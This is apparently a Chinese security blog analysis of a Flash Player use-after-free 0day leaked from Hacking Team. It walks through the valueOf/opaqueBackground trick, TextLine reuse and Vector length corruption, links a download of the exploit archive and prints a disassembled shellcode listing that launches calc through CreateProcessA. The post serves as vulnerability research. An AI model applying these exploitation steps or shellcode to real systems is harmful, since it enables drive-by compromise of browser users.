# Hacking Team 新 Flash 0day分析

0x00 背景
=======

* * *

继前几天从Hacking Team中找到一个flash 0day，Adobe发布修复补丁之后，又被人在邮件中找到了一个flash 0day。

readme中描述，影响范围为`Adobe Flash Player 9+ 32/64-bit (since Jun 2006)`。

Windows中的IE，OS X中的firefox均可直接执行计算器。

0x01 漏洞分析
=========

* * *

漏洞文件[http://krash.in/flashnew0day.zip](http://krash.in/flashnew0day.zip)，是从Hacking Team邮件中找到Flash 0day，简单看一下该漏洞的利用方法。

点击Run Calc之后，该程序会调用Check64()函数，这个函数是该漏洞的一个简化版，程序用32、64不同的内存结构判断当前是32位进程还是64位。程序在最开始重载了`MyClass`的`valueOf`

![enter image description here](http://drops.javaweb.org/uploads/images/ef7745e091e8052b9d4bbbb27532f7f085bfc734.jpg)

而`opeaqueBackground`属性接受数值型，故如果传入一个类，会显示调用该类的`valueOf`一次，这个也是之前的一个UAF用的一个技巧。所以，在第一次走到下列语句设置`opaqueBackground`的时候走到了`valueOf1`：

![enter image description here](http://drops.javaweb.org/uploads/images/70bf44917bd6af27ce662ed7020dc53a04e80153.jpg)

在`valueOf1`中，攻击者使用`recreateTextLine`重用`_tl`这个`textLine`，随之，原始`TextBlock（_tb）`中的内部`TextLine`对象被释放。

![enter image description here](http://drops.javaweb.org/uploads/images/5998ced2ac2a23a36ca73878a52e212946fc4b17.jpg)

----->

![enter image description here](http://drops.javaweb.org/uploads/images/eda741f1e4e0758964610c13ed5af28be59e4df7.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/0f49856348def703ec41f5d4523b33901295c780.jpg)

然后，在valueOf中使用

![enter image description here](http://drops.javaweb.org/uploads/images/c8c6a3428463e49487baffc3a79e938be80a3e2a.jpg)

占住这片被释放的内存，1016是`TextLine`对象在内存中的大小，1344相当于多分配了一块内存（1016/4-8）。函数`return 1`，写入到这片内存中。

`valueOf`返回后，程序搜索`_ar`，找到值为1的一项，根据该项的位置判断是32还是64位系统：

![enter image description here](http://drops.javaweb.org/uploads/images/ddc91dba6803135925d1a3ff41f83aefa6ef6c19.jpg)

随后，程序调用`TryExpl()`，这里使用了类似的方式：

先分配特殊长度的Vector和TextLine留待后用，接着将`MyClass`的`valueOf`也设置为`valueOf2`：

![enter image description here](http://drops.javaweb.org/uploads/images/75715bc2b1a79e58e0edc6327279d0c062a76c30.jpg)

然后设置`opaqueBackground`属性，`_mc`是`MyClass`的实例，因此触发`valueOf2`：

![enter image description here](http://drops.javaweb.org/uploads/images/6e9760f3ad30cd8d8800882bac95609baffd2782.jpg)

在`valueOf2`中使用和之前一样的方式给`_ar`的所有元素全部做一次内存破坏，`vLen`的值是98。

![enter image description here](http://drops.javaweb.org/uploads/images/0a964fb6c1492f9b39dfb78cff1a1ebe8e218079.jpg)

返回后，程序在`_ar`中搜索被破坏的块，并设置下一个`Vector`的`Length`为`0x40000000`，后续就是经典的`Vector`操作了。

![enter image description here](http://drops.javaweb.org/uploads/images/54db7755e88469917c6510ba44a439859040c4e8.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/a05dc9cc16b43119b8a0c75e760b136e06ea1533.jpg)

在`IE11+Flash Player 17`中，跟踪可发现`length`被覆盖后的`Vector`：

![enter image description here](http://drops.javaweb.org/uploads/images/a9e2f6b2a760860eeb393d482847ec38f1ad1720.jpg)

0x02 使用的shellcode
=================

* * *

和之前一样，使用`CreateProcessA`调用calc

```
0:008> uf 0x603b1b8
Flow analysis was incomplete, some code may be missing
0603b1b8 55              push    ebp
0603b1b9 8bec            mov     ebp,esp
0603b1bb 83c4ac          add     esp,0FFFFFFACh
0603b1be 53              push    ebx
0603b1bf 51              push    ecx
0603b1c0 57              push    edi
0603b1c1 648b0530000000  mov     eax,dword ptr fs:[30h]
0603b1c8 8b400c          mov     eax,dword ptr [eax+0Ch]
0603b1cb 8b400c          mov     eax,dword ptr [eax+0Ch]
0603b1ce 8b00            mov     eax,dword ptr [eax]
0603b1d0 8b00            mov     eax,dword ptr [eax]
0603b1d2 8b5818          mov     ebx,dword ptr [eax+18h]
0603b1d5 89d8            mov     eax,ebx
0603b1d7 03403c          add     eax,dword ptr [eax+3Ch]
0603b1da 8b5078          mov     edx,dword ptr [eax+78h]
0603b1dd 01da            add     edx,ebx
0603b1df 8b7a20          mov     edi,dword ptr [edx+20h]
0603b1e2 01df            add     edi,ebx
0603b1e4 31c9            xor     ecx,ecx

0603b1e6 8b07            mov     eax,dword ptr [edi]
0603b1e8 01d8            add     eax,ebx
0603b1ea 813843726561    cmp     dword ptr [eax],61657243h ; Crea
0603b1f0 751c            jne     0603b20e

0603b1f2 81780b73734100  cmp     dword ptr [eax+0Bh],offset IEXPLORE!api-ms-win-downlevel-shell32-l1-1-0_NULL_THUNK_DATA_DLA <PERF> (IEXPLORE+0x37373) (00417373) ;ssA   (=>CreateProcessA)
0603b1f9 7513            jne     0603b20e

0603b1fb 8b4224          mov     eax,dword ptr [edx+24h]
0603b1fe 01d8            add     eax,ebx
0603b200 0fb70448        movzx   eax,word ptr [eax+ecx*2]
0603b204 8b521c          mov     edx,dword ptr [edx+1Ch]
0603b207 01da            add     edx,ebx
0603b209 031c82          add     ebx,dword ptr [edx+eax*4]
0603b20c eb09            jmp     0603b217

0603b20e 83c704          add     edi,4
0603b211 41              inc     ecx
0603b212 3b4a18          cmp     ecx,dword ptr [edx+18h]
0603b215 7ccf            jl      0603b1e6

0603b217 8d45f0          lea     eax,[ebp-10h]
0603b21a 50              push    eax
0603b21b 8d7dac          lea     edi,[ebp-54h]
0603b21e 57              push    edi
0603b21f 31c0            xor     eax,eax
0603b221 b911000000      mov     ecx,11h
0603b226 f3ab            rep stos dword ptr es:[edi]
0603b228 c745ac44000000  mov     dword ptr [ebp-54h],44h
0603b22f 50              push    eax
0603b230 50              push    eax
0603b231 50              push    eax
0603b232 50              push    eax
0603b233 50              push    eax
0603b234 50              push    eax
0603b235 e809000000      call    0603b243
0603b23a 63616c          arpl    word ptr [ecx+6Ch],sp
0603b23d 632e            arpl    word ptr [esi],bp
0603b23f 657865          js      0603b2a7

0603b242 0050ff          add     byte ptr [eax-1],dl
0603b245 d35f59          rcr     dword ptr [edi+59h],cl
0603b248 5b              pop     ebx
0603b249 c1e003          shl     eax,3
0603b24c 83c006          add     eax,6
0603b24f c9              leave
0603b250 c3              ret

```

![enter image description here](http://drops.javaweb.org/uploads/images/51f59d5c81d358dffc2f0916cafcaad29b0c1eb5.jpg)

0x03 效果
=======

* * *

![enter image description here](http://drops.javaweb.org/uploads/images/e58cd8b101dd420bfa12cf68f0d00c681aa746ce.jpg)

在IE11中成功地启动了`calc.exe`

桌面截图：

![enter image description here](http://drops.javaweb.org/uploads/images/80e4d445695fe403bb3bfbf7bb8eaf9a71b0d4b1.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/f67f5cc85aa1fe91b882685ebd1bac51dcef7db6.jpg)